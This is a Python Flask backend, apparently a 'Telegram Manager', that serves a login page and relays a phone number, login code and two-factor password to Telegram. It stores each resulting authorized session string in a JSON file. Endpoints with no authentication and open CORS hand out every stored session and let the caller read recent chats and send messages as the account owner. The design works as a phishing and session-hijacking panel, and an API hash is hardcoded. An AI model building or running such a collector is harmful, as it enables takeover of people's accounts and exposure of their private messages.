from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
import json
import os
import asyncio
import nest_asyncio
from datetime import datetime

# Apply nest_asyncio for Render
nest_asyncio.apply()

app = Flask(__name__)
CORS(app)

# Your API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# Store temporary data for OTP
temp_data = {}

# Store accounts persistently - with Render support
accounts = []
ACCOUNTS_FILE = '/tmp/accounts.json'  # Render's writable temp directory

# Try to load existing accounts
if os.path.exists(ACCOUNTS_FILE):
    try:
        with open(ACCOUNTS_FILE, 'r') as f:
            accounts = json.load(f)
        print(f"✅ Loaded {len(accounts)} accounts")
    except:
        accounts = []
else:
    # Also check current directory as fallback
    if os.path.exists('accounts.json'):
        try:
            with open('accounts.json', 'r') as f:
                accounts = json.load(f)
            print(f"✅ Loaded {len(accounts)} accounts from local file")
        except:
            accounts = []

def save_accounts():
    """Save accounts to file"""
    try:
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
        # Also save to local file as backup
        with open('accounts.json', 'w') as f:
            json.dump(accounts, f, indent=2)
    except Exception as e:
        print(f"Error saving accounts: {e}")

# Helper to run async functions
def run_async(coro):
    return asyncio.run(coro)

@app.route('/')
def serve_login():
    return send_file('login.html')

@app.route('/dashboard')
def serve_dashboard():
    return send_file('dashboard.html')

# -------------------- SEND OTP --------------------
@app.route('/api/add-account', methods=['POST'])
def send_otp():
    data = request.json
    phone = data.get('phone')
    
    async def send_code():
        # Create client with empty string session
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        # Save the session string (even though not logged in, it contains DC info)
        session_str = client.session.save()
        # Disconnect – we don't need the client open
        await client.disconnect()
        return result.phone_code_hash, session_str
    
    try:
        phone_code_hash, session_str = run_async(send_code())
        session_id = str(int(datetime.now().timestamp()))
        temp_data[session_id] = {
            'phone': phone,
            'phone_code_hash': phone_code_hash,
            'session_str': session_str   # <- Save the session
        }
        print(f"📱 OTP sent to {phone}")
        return jsonify({'success': True, 'session_id': session_id})
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# -------------------- VERIFY OTP --------------------
@app.route('/api/verify-code', methods=['POST'])
def verify_otp():
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    
    if session_id not in temp_data:
        return jsonify({'success': False, 'error': 'Session expired'})
    
    session = temp_data[session_id]
    phone = session['phone']
    phone_code_hash = session['phone_code_hash']
    session_str = session['session_str']   # Get the saved session
    
    async def verify():
        # Recreate client with the SAME session (same DC)
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
        try:
            # Try to sign in
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            # Success
            me = await client.get_me()
            string_session = client.session.save()  # final authorized session
            await client.disconnect()
            return {'success': True, 'me': me, 'string_session': string_session}
        except errors.SessionPasswordNeededError:
            if password:
                await client.sign_in(password=password)
                me = await client.get_me()
                string_session = client.session.save()
                await client.disconnect()
                return {'success': True, 'me': me, 'string_session': string_session}
            else:
                await client.disconnect()
                return {'success': False, 'twofa_required': True}
        except Exception as e:
            await client.disconnect()
            return {'success': False, 'error': str(e)}
    
    try:
        result = run_async(verify())
        if result.get('success'):
            me = result['me']
            string_session = result['string_session']
            # Save account
            account = {
                'id': len(accounts) + 1,
                'phone': phone,
                'name': me.first_name or 'User',
                'username': me.username or '',
                'session': string_session,  # Changed to 'session' for dashboard
                'date': str(datetime.now())
            }
            accounts.append(account)
            save_accounts()
            # Clean up temp data
            del temp_data[session_id]
            print(f"✅ Account added: {phone}")
            return jsonify({'success': True, 'account': account})
        elif result.get('twofa_required'):
            return jsonify({'success': False, 'need_password': True, 'message': '2FA password required'})
        else:
            return jsonify({'success': False, 'error': result.get('error', 'Unknown error')})
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# -------------------- GET ACCOUNTS --------------------
@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    account_list = [{
        'id': a['id'],
        'phone': a['phone'],
        'name': a['name'],
        'username': a.get('username', ''),
        'session': a.get('session', a.get('string_session', ''))
    } for a in accounts]
    return jsonify({'success': True, 'accounts': account_list})

# -------------------- GET MESSAGES --------------------
@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    data = request.json
    account_id = data.get('accountId')
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    session_string = account.get('session', account.get('string_session', ''))
    
    async def fetch():
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        dialogs = await client.get_dialogs(limit=50)
        chats = []
        all_messages = []
        for dialog in dialogs:
            if dialog.is_user:
                name = dialog.entity.first_name or 'Unknown'
                if dialog.entity.last_name:
                    name += f" {dialog.entity.last_name}"
            else:
                name = dialog.name or 'Unknown'
            chat_id = str(dialog.id)
            chats.append({
                'id': chat_id,
                'title': name,
                'unread': dialog.unread_count or 0,
                'lastMessage': dialog.message.text[:50] if dialog.message and dialog.message.text else '',
                'lastMessageDate': dialog.message.date.timestamp() if dialog.message else None
            })
            # Get last 10 messages
            msgs = await client.get_messages(dialog.entity, limit=10)
            for msg in msgs:
                if msg and msg.text:
                    all_messages.append({
                        'chatId': chat_id,
                        'text': msg.text,
                        'date': msg.date.timestamp(),
                        'out': msg.out
                    })
        await client.disconnect()
        return {'chats': chats, 'messages': all_messages}
    
    try:
        result = run_async(fetch())
        return jsonify({'success': True, 'chats': result['chats'], 'messages': result['messages']})
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# -------------------- SEND MESSAGE --------------------
@app.route('/api/send-message', methods=['POST'])
def send_message():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    message = data.get('message')
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    session_string = account.get('session', account.get('string_session', ''))
    
    async def send():
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        try:
            entity = await client.get_entity(int(chat_id))
        except:
            entity = await client.get_entity(chat_id)
        await client.send_message(entity, message)
        await client.disconnect()
    
    try:
        run_async(send())
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# -------------------- REMOVE ACCOUNT --------------------
@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    data = request.json
    account_id = data.get('accountId')
    
    global accounts
    accounts = [a for a in accounts if a['id'] != account_id]
    save_accounts()
    
    return jsonify({'success': True})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print('\n' + '='*50)
    print('📱 TELEGRAM MANAGER - RENDER DEPLOYMENT')
    print('='*50)
    print(f'✅ Loaded {len(accounts)} accounts')
    print(f'✅ Using {ACCOUNTS_FILE} for storage')
    print('✅ DC info preserved for OTP')
    print('='*50 + '\n')
    
    app.run(host='0.0.0.0', port=port)
